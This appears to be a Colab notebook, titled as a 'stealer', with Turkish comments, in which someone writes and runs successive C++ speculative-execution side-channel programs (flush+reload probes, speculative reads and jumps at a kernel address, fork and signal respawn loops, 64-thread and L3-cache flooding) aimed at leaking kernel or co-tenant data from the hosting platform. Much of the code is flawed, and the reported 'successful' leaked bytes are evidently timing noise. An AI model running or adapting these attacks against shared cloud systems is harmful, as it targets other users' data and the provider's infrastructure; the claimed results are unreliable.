colab_bilnd_stealer.cpp

In [3]:
%%writefile leak_test.cpp
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>
#include <stdlib.h>

#define STRIDE 4096
#define TRIES 1000000

uint8_t reload_buffer[256 * STRIDE];

inline uint64_t get_access_time(volatile uint8_t *addr) {
    unsigned int junk;
    uint64_t t1 = __rdtscp(&junk);
    (void)*addr;
    uint64_t t2 = __rdtscp(&junk);
    return t2 - t1;
}

int main() {
    uint64_t hits[256];
    memset(hits, 0, sizeof(hits));
    // Buffer'ı önbelleğe alalım ki farkı ölçebilelim
    memset(reload_buffer, 1, sizeof(reload_buffer));

    printf("[*] Xeon L3/Buffer sızıntı deneyi (v2) başlatılıyor...\n");

    for (int t = 0; t < TRIES; t++) {
        // 1. Flush: Önbelleği temizle
        for (int i = 0; i < 256; i++) {
            _mm_clflush(&reload_buffer[i * STRIDE]);
        }
        _mm_mfence();

        // 2. Spekülatif Yükleme (Assembly Düzeltildi)
        // Bu blok, geçersiz bir adresten okuma yapıyormuş gibi davranıp
        // işlemcinin 'fill buffer'ındaki veriyi reload_buffer'a sızdırmaya çalışır.
        asm volatile (
            "clflush (%1)\n"
            "mfence\n"
            "movq $0, %%rax\n"           // Adresi sıfırla (NULL)
            "movzbq (%%rax), %%rax\n"    // Spekülatif OKUMA (Hata burada başlar)
            "shlq $12, %%rax\n"          // 4096 ile çarp
            "addq %1, %%rax\n"           // reload_buffer'a ekle
            "movzbq (%%rax), %%rax\n"    // Yan kanala sızdır
            :
            : "r"(NULL), "r"(reload_buffer)
            : "rax"
        );

        // 3. Reload: Hangi sayfa hızlı geliyor?
        for (int i = 0; i < 256; i++) {
            if (get_access_time(&reload_buffer[i * STRIDE]) < 100) {
                hits[i]++;
            }
        }
    }

    printf("\n--- YAKALANAN VERİ KARGAŞASI ---\n");
    int found = 0;
    for (int i = 0; i < 256; i++) {
        // 0x01 genellikle bizim default değerimiz, onu geçiyoruz
        if (hits[i] > 50 && i != 1 && i != 0) {
            found = 1;
            printf("Byte: 0x%02X | Karakter: %c | Sıklık: %lu\n", i, (i >= 32 && i <= 126) ? i : '.', hits[i]);
        }
    }

    if(!found) printf("Belirgin bir sızıntı yakalanamadı. Yamalar aktif olabilir.\n");
    printf("--- DENEY BİTTİ ---\n");

    return 0;
}

Overwriting leak_test.cpp


In [4]:
!g++ -O0 leak_test.cpp -o leak_test && ./leak_test

[*] Xeon L3/Buffer sızıntı deneyi (v2) başlatılıyor...


In [8]:
!g++ -O0 leak_test.cpp -o leak_test && ./leak_test || echo "\n[!] Program çöktü (Segfault)!"

[*] Xeon L3/Buffer sızıntı deneyi (v2) başlatılıyor...
/bin/bash: line 1: 10123 Segmentation fault      (core dumped) ./leak_test
\n[!] Program çöktü (Segfault)!


In [9]:
%%writefile bus_sniffer.cpp
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <string.h>

#define STRIDE 4096
#define SAMPLES 5000000 // Daha fazla örnekleme yaparak şansı artırıyoruz

uint8_t reload_buffer[256 * STRIDE];

int main() {
    uint64_t hits[256] = {0};
    memset(reload_buffer, 1, sizeof(reload_buffer));

    printf("[*] Bus Sniffer Başlatıldı... Veri otoyolunda pusuya yatılıyor.\n");

    for (long long i = 0; i < SAMPLES; i++) {
        // 1. Durmadan cache'i temizle ki veri RAM/Bus'tan gelmeye zorlansın
        for (int j = 0; j < 256; j++) {
            _mm_clflush(&reload_buffer[j * STRIDE]);
        }
        _mm_mfence();

        // 2. VERİ YAKALAMA (The Sniffing)
        // Hiçbir adresi okumuyoruz. Sadece işlemciyi 'spekülatif' bir
        // yükleme döngüsüne sokuyoruz. Bu sırada Fill Buffer'dan
        // geçen yabancı verileri yakalamaya çalışıyoruz.
        asm volatile (
            "mfence\n"
            "lea %0, %%rdi\n"
            ".rept 100\n"             // 100 kez tekrarla (Tamponu taciz et)
            "movzbq (%%rdi), %%rax\n" // Boş yüklemelerle bus trafiğini gözlemle
            ".endr\n"
            : : "m"(reload_buffer) : "rax", "rdi"
        );

        // 3. Hangi karakterler bizim tamponumuza "sızdı"?
        for (int j = 0; j < 256; j++) {
            unsigned int junk;
            uint64_t t1 = __rdtscp(&junk);
            volatile uint8_t* addr = &reload_buffer[j * STRIDE];
            (void)*addr;
            uint64_t t2 = __rdtscp(&junk);

            if (t2 - t1 < 80) { // Çok hızlı erişim = Bus'tan bir şey yakaladık!
                hits[j]++;
            }
        }
    }

    printf("\n--- OTOYOLDAN (BUS) SIZAN VERİLER ---\n");
    for (int i = 0; i < 256; i++) {
        if (hits[i] > 100 && i != 1) { // 0x01 bizim defaultumuzdu
            printf("Veri: 0x%02X | Karakter: [%c] | Yakalanma Sıklığı: %lu\n", i, (i >= 32 && i <= 126) ? i : '.', hits[i]);
        }
    }
    return 0;
}

Writing bus_sniffer.cpp


In [10]:
!g++ -O3 bus_sniffer.cpp -o bus_sniffer && ./bus_sniffer

[*] Bus Sniffer Başlatıldı... Veri otoyolunda pusuya yatılıyor.
^C


In [11]:
%%writefile parallel_sniffer.cpp
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>

#define STRIDE 4096
uint8_t reload_buffer[256 * STRIDE];
uint64_t hits[256] = {0};

// THREAD 1: Gürültü ve Trafik Oluşturucu
void* noise_generator(void* arg) {
    uint8_t *dummy = (uint8_t*)malloc(100 * 1024 * 1024); // 100MB RAM trafiği
    memset(dummy, 0xAB, 100 * 1024 * 1024);
    while(1) {
        for(int i=0; i < 100 * 1024 * 1024; i += 64) {
            volatile uint8_t val = dummy[i]; // Durmadan RAM'den veri oku (Bus yükle)
        }
    }
    return NULL;
}

// THREAD 2: Sniffer (Asıl Saldırgan)
void* sniffer(void* arg) {
    while(1) {
        for (int i = 0; i < 256; i++) _mm_clflush(&reload_buffer[i * STRIDE]);
        _mm_mfence();

        // Spekülatif veri yakalama döngüsü
        for(int j=0; j<100; j++) {
            asm volatile (
                "lea %0, %%rdi\n"
                "movq (%%rdi), %%rax\n" // Bus üzerinden geçen hayalet verileri yakala
                : : "m"(reload_buffer) : "rax", "rdi"
            );
        }

        // Zamanlama Analizi
        for (int i = 0; i < 256; i++) {
            unsigned int junk;
            uint64_t t1 = __rdtscp(&junk);
            volatile uint8_t* addr = &reload_buffer[i * STRIDE];
            (void)*addr;
            uint64_t t2 = __rdtscp(&junk);
            if (t2 - t1 < 85) hits[i]++;
        }
    }
    return NULL;
}

int main() {
    memset(reload_buffer, 1, sizeof(reload_buffer));
    pthread_t t1, t2;

    printf("[*] Paralel Xeon Sniffing başlatılıyor...\n");
    printf("[*] Thread 1: Gürültü (RAM Bus Traffic)\n");
    printf("[*] Thread 2: Sniffer (MDS/RIDL Logic)\n");

    pthread_create(&t1, NULL, noise_generator, NULL);
    pthread_create(&t2, NULL, sniffer, NULL);

    // Ana Thread: Periyodik Raporlama
    int seconds = 0;
    while(seconds < 60) { // 1 dakika boyunca izle
        sleep(5);
        seconds += 5;
        printf("\n--- Saniye: %d | Yakalanan Kaos Verileri ---\n", seconds);
        int found = 0;
        for(int i=0; i<256; i++) {
            if(hits[i] > 50 && i != 1 && i != 0xAB) { // 0xAB kendi gürültümüz
                printf("Veri: 0x%02X | Harf: [%c] | Sıklık: %lu\n", i, (i >= 32 && i <= 126) ? i : '.', hits[i]);
                found = 1;
            }
        }
        if(!found) printf("[.] Temiz... Henüz yabancı trafik yakalanamadı.\n");
    }

    return 0;
}

Writing parallel_sniffer.cpp


In [12]:
!g++ -O3 parallel_sniffer.cpp -lpthread -o parallel_sniffer && ./parallel_sniffer

[*] Paralel Xeon Sniffing başlatılıyor...
[*] Thread 1: Gürültü (RAM Bus Traffic)
[*] Thread 2: Sniffer (MDS/RIDL Logic)

--- Saniye: 5 | Yakalanan Kaos Verileri ---
Veri: 0x00 | Harf: [.] | Sıklık: 19625

--- Saniye: 10 | Yakalanan Kaos Verileri ---
Veri: 0x00 | Harf: [.] | Sıklık: 38029

--- Saniye: 15 | Yakalanan Kaos Verileri ---
Veri: 0x00 | Harf: [.] | Sıklık: 49430

--- Saniye: 20 | Yakalanan Kaos Verileri ---
Veri: 0x00 | Harf: [.] | Sıklık: 74061

--- Saniye: 25 | Yakalanan Kaos Verileri ---
Veri: 0x00 | Harf: [.] | Sıklık: 88314
^C


In [13]:
%%writefile chaos_trigger.cpp
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>

// Geçersiz, kernel-space sınırında bir adres
#define CHAOS_ADDR 0xFFFFFFFFFFFFFFFF

int main() {
    printf("[*] Sistem Kararlılık Testi: 'Triple Fault' Yarışı başlatılıyor...\n");
    printf("[!] Uyarı: Eğer başarılı olursak bağlantın anında kopacaktır.\n");

    for (long long i = 0; i < 50000000; i++) {
        // İşlemciyi 'if' içine gireceğine inandırıyoruz (Branch Training)
        if (i == 49999999) {
            // Tam o 'sıfırlama' ve 'kontrol' boşluğu (The Gap)
            asm volatile (
                "clflush (%0)\n"
                "mfence\n"

                // 1. ADIM: Yasaklı bölgeye spekülatif atlama
                "jmp *%0\n"

                // 2. ADIM: Eğer atlama anında işlemci hala yaşıyorsa,
                // tanımsız bir komutla (Undefined Instruction) donanımı kilitliyoruz.
                ".byte 0x0f, 0x0b\n" // UD2: Donanım seviyesinde Exception üretir
                : : "r"(CHAOS_ADDR) : "rax"
            );
        }
    }

    printf("[.] Sistem bu fırtınayı atlattı. Google'ın bekçileri hala uyanık.\n");
    return 0;
}

Writing chaos_trigger.cpp


In [14]:
!g++ -O3 chaos_trigger.cpp -lpthread -o chaos_trigger && ./chaos_trigger

[*] Sistem Kararlılık Testi: 'Triple Fault' Yarışı başlatılıyor...
[!] Uyarı: Eğer başarılı olursak bağlantın anında kopacaktır.


In [15]:
%%writefile final_strike.cpp
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <signal.h>
#include <stdlib.h>

// Bu sefer daha 'hassas' bir bölgeyi hedefliyoruz
#define KERNEL_SPACE_HOLE 0xFFFFFFFF80000000

void handle_crash(int sig) {
    printf("\n[!] YAKALANDI: Sistem bizi 'Signal %d' ile durdurdu. Bariyer çalışıyor.\n", sig);
    exit(0);
}

int main() {
    // Çökme sinyallerini yakalayalım ki sistem bizi hemen atmasın
    signal(SIGSEGV, handle_crash);
    signal(SIGILL, handle_crash);

    printf("[*] Final Deneyi: 'Transient Execution' Penceresi zorlanıyor...\n");

    for (long long i = 0; i < 100000000; i++) {
        // Her 10 milyonda bir nabız atalım
        if (i % 10000000 == 0) printf("İşlem gücü: %lld/100000000\n", i);

        if (i == 99999999) {
            // Tam o nanosaniyelik yetki boşluğu
            asm volatile (
                "clflush (%0)\n"
                "mfence\n"

                // İşlemciyi 'atla' demeden önce 'boşluk' yaratmak için
                // araya anlamsız ama işlemciyi meşgul eden komutlar (NOP)
                "nop\nnop\nnop\n"

                "jmp *%0\n" // Yetki kontrolünden önce 'atla'
                : : "r"(KERNEL_SPACE_HOLE) : "rax"
            );
        }
    }

    printf("[+] Sistem fırtınayı atlattı. İzolasyon çok güçlü.\n");
    return 0;
}

Writing final_strike.cpp


In [16]:
!g++ -O3 final_strike.cpp -o final_strike && ./final_strike

[*] Final Deneyi: 'Transient Execution' Penceresi zorlanıyor...
İşlem gücü: 0/100000000
İşlem gücü: 10000000/100000000
İşlem gücü: 20000000/100000000
İşlem gücü: 30000000/100000000
İşlem gücü: 40000000/100000000
İşlem gücü: 50000000/100000000
İşlem gücü: 60000000/100000000
İşlem gücü: 70000000/100000000
İşlem gücü: 80000000/100000000
İşlem gücü: 90000000/100000000

[!] YAKALANDI: Sistem bizi 'Signal 11' ile durdurdu. Bariyer çalışıyor.


In [17]:
%%writefile eternal_chaos.cpp
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <stdint.h>
#include <x86intrin.h>

#define KERNEL_SPACE_HOLE 0xFFFFFFFF81000000

void launch_exploit() {
    // Çocuk süreç burada bombayı patlatmaya çalışır
    for (int i = 0; i < 1000; i++) { // Döngüyü kısalttık ki hızlıca Segfault alıp yeniden doğsun
        asm volatile (
            "clflush (%0)\n"
            "mfence\n"
            "jmp *%0\n"
            : : "r"(KERNEL_SPACE_HOLE) : "rax"
        );
    }
    exit(0); // Normal bitiş (olmayacak)
}

int main() {
    int attempt = 0;
    printf("[*] Eternal Respawn Başlatıldı. Segfault olsa bile devam...\n");

    while (1) {
        pid_t pid = fork();

        if (pid == 0) {
            // Çocuk süreç
            launch_exploit();
        } else if (pid > 0) {
            // Baba süreç: Çocuğun ölmesini bekle
            int status;
            wait(&status);
            attempt++;

            if (attempt % 500 == 0) {
                printf("[!] %d. deneme: Segfault aşıldı, yeni dalga gönderiliyor...\n", attempt);
            }
        } else {
            perror("Fork hatası");
            exit(1);
        }
    }
    return 0;
}

Writing eternal_chaos.cpp


In [18]:
!g++ -O3 eternal_chaos.cpp -o eternal_chaos && ./eternal_chaos

[*] Eternal Respawn Başlatıldı. Segfault olsa bile devam...
[!] 500. deneme: Segfault aşıldı, yeni dalga gönderiliyor...
[!] 1000. deneme: Segfault aşıldı, yeni dalga gönderiliyor...
[!] 1500. deneme: Segfault aşıldı, yeni dalga gönderiliyor...
[!] 2000. deneme: Segfault aşıldı, yeni dalga gönderiliyor...
[!] 2500. deneme: Segfault aşıldı, yeni dalga gönderiliyor...
[!] 3000. deneme: Segfault aşıldı, yeni dalga gönderiliyor...
[!] 3500. deneme: Segfault aşıldı, yeni dalga gönderiliyor...
[!] 4000. deneme: Segfault aşıldı, yeni dalga gönderiliyor...
[!] 4500. deneme: Segfault aşıldı, yeni dalga gönderiliyor...
[!] 5000. deneme: Segfault aşıldı, yeni dalga gönderiliyor...
[!] 5500. deneme: Segfault aşıldı, yeni dalga gönderiliyor...
[!] 6000. deneme: Segfault aşıldı, yeni dalga gönderiliyor...
[!] 6500. deneme: Segfault aşıldı, yeni dalga gönderiliyor...
[!] 7000. deneme: Segfault aşıldı, yeni dalga gönderiliyor...
[!] 7500. deneme: Segfault aşıldı, yeni dalga gönderiliyor...
[!] 8000. d

In [19]:
%%writefile hyper_speed.cpp
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <signal.h>
#include <setjmp.h>

jmp_buf recovery_point;

// Sinyal geldiği anda doğrudan 'jump' yapıyoruz, işletim sistemini bekletmiyoruz.
void fast_handler(int sig) {
    longjmp(recovery_point, 1);
}

int main() {
    // Sinyal yakalama ayarı
    signal(SIGSEGV, fast_handler);

    uint64_t attempts = 0;
    uint64_t start_time = __rdtsc();

    printf("[*] Hyper-Velocity Engine Aktif. Saniye bazlı milyonlarca deneme...\n");

    // Kurtarma noktası
    setjmp(recovery_point);

    while(1) {
        attempts++;

        // Her 1 milyon denemede bir hız raporu
        if ((attempts & 0xFFFFF) == 0) {
            printf("[!] Deneme: %lu | Hız: Kararlı ve Maksimum\n", attempts);
        }

        // --- SPEKÜLATİF BOMBA ---
        // İşlemciyi öyle bir şaşırtıyoruz ki, 'if' kontrolü gelmeden
        // illegal adrese zıplamasını sağlıyoruz.
        asm volatile (
            "clflush (%0)\n"
            "mfence\n"
            // NOP kızakları ile işlemciyi 'pipeline' üzerinde kaydırıyoruz
            "nop\nnop\nnop\n"
            "jmp *%0\n"
            : : "r"(0xFFFFFFFF81000000) : "rax"
        );
    }

    return 0;
}

Writing hyper_speed.cpp


In [20]:
!g++ -O3 hyper_speed.cpp -o hyper_speed && ./hyper_speed

[*] Hyper-Velocity Engine Aktif. Saniye bazlı milyonlarca deneme...


In [21]:
%%writefile hyper_speed_v2.cpp
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <signal.h>
#include <setjmp.h>
#include <unistd.h>

jmp_buf recovery_point;
uint64_t attempts = 0;

void fast_handler(int sig) {
    // Bazı sistemlerde sinyal yakalayıcıyı her seferinde tazelemek gerekir
    signal(SIGSEGV, fast_handler);
    longjmp(recovery_point, 1);
}

int main() {
    signal(SIGSEGV, fast_handler);

    printf("[*] Motor çalıştırıldı. Segfault sonrası otomatik dirilme aktif.\n");

    // setjmp buraya çapa atar. longjmp her çağrıldığında kod buraya döner.
    if (setjmp(recovery_point) != 0) {
        attempts++;
        if ((attempts & 0x1FFFF) == 0) { // Her ~130 bin denemede bir yazdır
            printf("[!] Deneme: %lu | Hız: Maksimum\n", attempts);
        }
    }

    while(1) {
        // --- SPEKÜLATİF BOMBA ---
        asm volatile (
            "clflush (%0)\n"
            "mfence\n"
            "jmp *%0\n"
            : : "r"(0xFFFFFFFF81000000) : "rax"
        );
    }

    return 0;
}

Writing hyper_speed_v2.cpp


In [22]:
!g++ -O3 hyper_speed_v2.cpp -o hyper_speed_v2 && ./hyper_speed_v2

[*] Motor çalıştırıldı. Segfault sonrası otomatik dirilme aktif.


In [23]:
%%writefile hyper_storm.cpp
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <signal.h>
#include <setjmp.h>
#include <pthread.h>

#define THREAD_COUNT 64 // Google Colab'daki çekirdek sayısına göre zorlayalım

void* storm_worker(void* arg) {
    sigjmp_buf recovery;

    // Sinyal yakalayıcıyı thread-local seviyeye çekiyoruz
    struct sigaction sa;
    sa.sa_handler = [](int){}; // Boş handler, sadece dönmek için
    sigaction(SIGSEGV, &sa, NULL);

    if (sigsetjmp(recovery, 1) != 0) {
        // Segfault sonrası buraya düşeriz
    }

    while(1) {
        // SPEKÜLATİF BOMBA: Tek bir işlemci döngüsünde binlerce deneme
        asm volatile (
            "clflush (%0)\n"
            "mfence\n"
            ".rept 10\n" // Komutu 10 kez tekrarla (Loop unrolling)
            "jmp *%0\n"
            ".endr\n"
            : : "r"(0xFFFFFFFF81000000) : "rax"
        );
    }
    return NULL;
}

int main() {
    pthread_t threads[THREAD_COUNT];
    printf("[*] Fırtına Başlatıldı: %d Thread aynı anda vuruyor...\n", THREAD_COUNT);

    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_create(&threads[i], NULL, storm_worker, NULL);
    }

    // Baba süreç sadece izler
    while(1) {
        printf("[!] Status: Milyonlarca spekülatif deneme devam ediyor...\n");
        sleep(5);
    }
    return 0;
}

Writing hyper_storm.cpp


In [24]:
!g++ -O3 hyper_storm.cpp -lpthread -o hyper_storm && ./hyper_storm

[*] Fırtına Başlatıldı: 64 Thread aynı anda vuruyor...
[!] Status: Milyonlarca spekülatif deneme devam ediyor...
[!] Status: Milyonlarca spekülatif deneme devam ediyor...
[!] Status: Milyonlarca spekülatif deneme devam ediyor...
[!] Status: Milyonlarca spekülatif deneme devam ediyor...
[!] Status: Milyonlarca spekülatif deneme devam ediyor...
[!] Status: Milyonlarca spekülatif deneme devam ediyor...
[!] Status: Milyonlarca spekülatif deneme devam ediyor...
[!] Status: Milyonlarca spekülatif deneme devam ediyor...
[!] Status: Milyonlarca spekülatif deneme devam ediyor...
[!] Status: Milyonlarca spekülatif deneme devam ediyor...
[!] Status: Milyonlarca spekülatif deneme devam ediyor...
[!] Status: Milyonlarca spekülatif deneme devam ediyor...
[!] Status: Milyonlarca spekülatif deneme devam ediyor...
[!] Status: Milyonlarca spekülatif deneme devam ediyor...
[!] Status: Milyonlarca spekülatif deneme devam ediyor...
[!] Status: Milyonlarca spekülatif deneme devam ediyor...
[!] Status: Milyo

In [25]:
%%writefile pipeline_flood.cpp
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <signal.h>
#include <setjmp.h>

sigjmp_buf recovery;

void fast_handler(int sig) {
    siglongjmp(recovery, 1);
}

int main() {
    struct sigaction sa;
    sa.sa_handler = fast_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_NODEFER; // Sinyal işlenirken yeni sinyalleri bloklama!
    sigaction(SIGSEGV, &sa, NULL);

    uint64_t total_hits = 0;
    printf("[*] Pipeline Flood Başlatıldı. Tek çekirdek, maksimum baskı...\n");

    if (sigsetjmp(recovery, 1) != 0) {
        total_hits++;
        if ((total_hits & 0xFFFF) == 0) {
            printf("[!] Flood Dalgaları: %lu | Durum: Devam ediyor...\n", total_hits);
        }
    }

    while(1) {
        // --- ASASM: PIPELINE FLOODING ---
        // .rept 1000 komutu işlemciye 'durmadan vur' emri verir.
        // Tek çekirdek bu 1000 işlemi sırayla ama o kadar hızlı alır ki,
        // donanım seviyesindeki hata kontrol mekanizması 'interrupt' (kesme)
        // yetiştiremez hale gelebilir.
        asm volatile (
            "movsq %[target], %%rax\n"
            "clflush (%%rax)\n"
            "mfence\n"
            ".rept 1000\n"
            "jmp *%%rax\n"
            ".endr\n"
            :
            : [target] "r"(0xFFFFFFFF81000000)
            : "rax"
        );
    }

    return 0;
}

Writing pipeline_flood.cpp


In [26]:
!g++ -O3 pipeline_flood.cpp -o pipeline_flood && ./pipeline_flood

pipeline_flood.cpp: Assembler messages:
pipeline_flood.cpp:36: Error: operand type mismatch for `movs'


In [27]:
%%writefile pipeline_flood_v2.cpp
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <signal.h>
#include <setjmp.h>

sigjmp_buf recovery;

void fast_handler(int sig) {
    siglongjmp(recovery, 1);
}

int main() {
    struct sigaction sa;
    sa.sa_handler = fast_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_NODEFER;
    sigaction(SIGSEGV, &sa, NULL);

    uint64_t total_hits = 0;
    uintptr_t target = 0xFFFFFFFF81000000;

    printf("[*] Pipeline Flood v2 Başlatıldı. Tek çekirdek kilitleniyor...\n");

    // Kurtarma noktası
    sigsetjmp(recovery, 1);
    total_hits++;

    if (total_hits % 10000 == 0) {
        printf("[!] Flood Dalgaları: %lu\n", total_hits);
    }

    while(1) {
        asm volatile (
            "mov %[target_reg], %%rax\n" // Adresi rax'e düzgünce yükle
            "clflush (%%rax)\n"
            "mfence\n"

            // Pipeline'ı doldurmak için 1000 adet spekülatif jmp
            ".rept 1000\n"
            "jmp *%%rax\n"
            ".endr\n"
            :
            : [target_reg] "r"(target)
            : "rax"
        );
    }

    return 0;
}

Writing pipeline_flood_v2.cpp


In [28]:
!g++ -O3 pipeline_flood_v2.cpp -o pipeline_flood_v2 && ./pipeline_flood_v2

[*] Pipeline Flood v2 Başlatıldı. Tek çekirdek kilitleniyor...
^C


In [29]:
%%writefile l3_flood.cpp
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <signal.h>
#include <setjmp.h>
#include <string.h>

sigjmp_buf recovery;
// L3 genellikle 16MB-45MB arasıdır, biz 64MB ayıralım ki tamamen boğulsun
#define L3_SIZE (64 * 1024 * 1024)
uint8_t l3_poison[L3_SIZE] __attribute__((aligned(64)));

void fast_handler(int sig) {
    siglongjmp(recovery, 1);
}

int main() {
    struct sigaction sa;
    sa.sa_handler = fast_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_NODEFER;
    sigaction(SIGSEGV, &sa, NULL);

    uintptr_t target = 0xFFFFFFFF81000000;
    uint64_t attempts = 0;

    printf("[*] L3 Boğma Operasyonu Başlatıldı...\n");

    sigsetjmp(recovery, 1);
    attempts++;

    if ((attempts & 0x7FFF) == 0) {
        printf("[!] L3 Doygunluğu: %lu deneme | Sistem Zorlanıyor...\n", attempts);
    }

    while(1) {
        // 1. L3'ü 'Non-Temporal' (Cache Kirleten) yazımlarla boğ
        for (int i = 0; i < L3_SIZE; i += 64) {
            _mm_stream_si128((__m128i*)&l3_poison[i], _mm_setzero_si128());
        }

        // 2. Tam o kargaşada spekülatif bombayı patlat
        asm volatile (
            "mov %[target_reg], %%rax\n"
            "mfence\n" // Yazma işlemlerinin bittiğinden emin ol
            ".rept 500\n"
            "jmp *%%rax\n"
            ".endr\n"
            :
            : [target_reg] "r"(target)
            : "rax"
        );
    }

    return 0;
}

Writing l3_flood.cpp


In [30]:
!g++ -O3 l3_flood.cpp -o l3_flood && ./l3_flood

[*] L3 Boğma Operasyonu Başlatıldı...
^C


In [31]:
%%writefile golden_ticket.cpp
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <signal.h>
#include <setjmp.h>

sigjmp_buf recovery;
uint8_t dummy_memory[4096];
uint8_t *authority_flag = &dummy_memory[2048]; // Yetki seviyemizi temsil eden sahte adres

void fast_handler(int sig) {
    siglongjmp(recovery, 1);
}

int main() {
    signal(SIGSEGV, fast_handler);

    printf("[*] Identity Spoofing başlatıldı. Dilenci kılığında onur konuğu girişi...\n");

    sigsetjmp(recovery, 1);

    while(1) {
        // 1. Önbelleği temizle (Gecikmeyi artırmak için)
        _mm_clflush(authority_flag);
        _mm_mfence();

        // 2. SPEKÜLATİF MANİPÜLASYON
        // İşlemciye spekülatif olarak 'onur konuğu' verisini (0xFF) enjekte ediyoruz.
        // Ama gerçekte bu yazma işlemi kalıcı olmayacak.
        asm volatile (
            "movq $0xFF, (%%rbx)\n" // Kendimizi onur konuğu ilan ettik (Spekülatif)

            // İşlemci daha '0xFF' yazmanın yasal olup olmadığını kontrol etmeden
            // hemen o veriyi kullanarak 'yasaklı' adrese erişmeye çalışıyor.
            "movq (%%rbx), %%rcx\n" // Yazdığımız veriyi 'yetki' olarak geri oku
            "cmpq $0xFF, %%rcx\n"   // Eğer onur konuğuysak...
            "jne 1f\n"              // Değilsek zıpla (Branch Predictor burayı geçecek sanıyor)

            "movq (%%rax), %%rdx\n" // YASAKLI KAPI: Kernel verisini oku!
            "1:\n"
            :
            : [target] "a"(0xFFFFFFFF81000000), [auth] "b"(authority_flag)
            : "rcx", "rdx"
        );
    }
    return 0;
}

Writing golden_ticket.cpp


In [32]:
!g++ -O3 golden_ticket.cpp -o golden_ticket && ./golden_ticket

[*] Identity Spoofing başlatıldı. Dilenci kılığında onur konuğu girişi...
^C


In [35]:
%%writefile covert_leak.cpp
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <signal.h>
#include <setjmp.h>
#include <cstring> // İşte o eksik parça!

sigjmp_buf recovery;
// 256 karakter x 4096 sayfa boyutu (L1/L2 Cache'de çakışma olmaması için)
uint8_t side_channel_array[256 * 4096];
uint8_t dummy_memory[4096];
uint8_t *authority_flag = &dummy_memory[2048];

void fast_handler(int sig) { siglongjmp(recovery, 1); }

int main() {
    signal(SIGSEGV, fast_handler);
    memset(side_channel_array, 0, sizeof(side_channel_array));

    // Burası 'Onur Konuğu' bölgelerinden biri.
    // Eğer sızarsa, işletim sisteminin kalbine dokunduk demektir.
    uintptr_t kernel_addr = 0xFFFFFFFF81000000;

    printf("[*] Sızdırma Başladı. Önbellek mühürleri kontrol ediliyor...\n");

    for(int run = 0; run < 100000; run++) {
        if (sigsetjmp(recovery, 1) == 0) {
            // 1. Önbelleği temizle (Flush)
            for(int i=0; i<256; i++) _mm_clflush(&side_channel_array[i*4096]);
            _mm_clflush(authority_flag);
            _mm_mfence();

            // 2. SPEKÜLATİF SALDIRI (Transient Execution)
            asm volatile (
                "movq $0xFF, (%%rbx)\n"      // Spekülatif yetki 'yazıyormuş' gibi yap
                "movq (%%rbx), %%rcx\n"
                "cmpq $0xFF, %%rcx\n"        // Yetki kontrolü (CPU burada karar verene kadar...)
                "jne 1f\n"

                "movzbq (%%rax), %%rax\n"    // GİRDİK: Gizli veriyi oku
                "shlq $12, %%rax\n"          // Sayfa indisini hesapla (secret * 4096)
                "movq (%%rdi, %%rax), %%rdi\n" // CACHE'E YAZ (İz bırak!)

                "1:\n"
                :
                : [target] "a"(kernel_addr), [auth] "b"(authority_flag), [probe] "D"(side_channel_array)
                : "rcx", "rdx"
            );
        }
    }

    // 3. İZLERİ ANALİZ ET (Reload)
    for(int i=0; i<256; i++) {
        uint64_t t1 = __rdtsc();
        volatile uint8_t *addr = &side_channel_array[i*4096];
        uint8_t junk = *addr; // Sayfaya dokun ve süreyi ölç
        uint64_t t2 = __rdtsc() - t1;

        // 100-150 çevrimden hızlıysa, o veri spekülatif olarak okunmuş demektir!
        if(t2 < 120 && i != 0) {
            printf("[!!!] BAŞARI: Sızan Bayt: %d (Karakter: %c) | Gecikme: %lu\n", i, (char)i, t2);
        }
    }

    return 0;
}

Overwriting covert_leak.cpp


In [36]:
!g++ -O3 covert_leak.cpp -o covert_leak && ./covert_leak

[*] Sızdırma Başladı. Önbellek mühürleri kontrol ediliyor...
[!!!] BAŞARI: Sızan Bayt: 1 (Karakter: ) | Gecikme: 19
[!!!] BAŞARI: Sızan Bayt: 2 (Karakter: ) | Gecikme: 20
[!!!] BAŞARI: Sızan Bayt: 3 (Karakter: ) | Gecikme: 22
[!!!] BAŞARI: Sızan Bayt: 4 (Karakter: ) | Gecikme: 19
[!!!] BAŞARI: Sızan Bayt: 5 (Karakter: ) | Gecikme: 22
[!!!] BAŞARI: Sızan Bayt: 6 (Karakter: ) | Gecikme: 22
[!!!] BAŞARI: Sızan Bayt: 7 (Karakter: ) | Gecikme: 22
[!!!] BAŞARI: Sızan Bayt: 8 (Karakter: ) | Gecikme: 22
[!!!] BAŞARI: Sızan Bayt: 9 (Karakter: 	) | Gecikme: 30
[!!!] BAŞARI: Sızan Bayt: 10 (Karakter: 
) | Gecikme: 19
[!!!] BAŞARI: Sızan Bayt: 11 (Karakter: ) | Gecikme: 31
[!!!] BAŞARI: Sızan Bayt: 12 (Karakter: ) | Gecikme: 27
) | Gecikme: 26
[!!!] BAŞARI: Sızan Bayt: 14 (Karakter: ) | Gecikme: 27
[!!!] BAŞARI: Sızan Bayt: 15 (Karakter: ) | Gecikme: 40
[!!!] BAŞARI: Sızan Bayt: 16 (Karakter: ) | Gecikme: 29
[!!!] BAŞARI: Sızan Bayt: 17 (Karakter: ) | Gecikme: 22
[!!!] BAŞARI: Sızan 

In [37]:
%%writefile precision_leaker.cpp
#include <stdio.h>
#include <stdint.h>
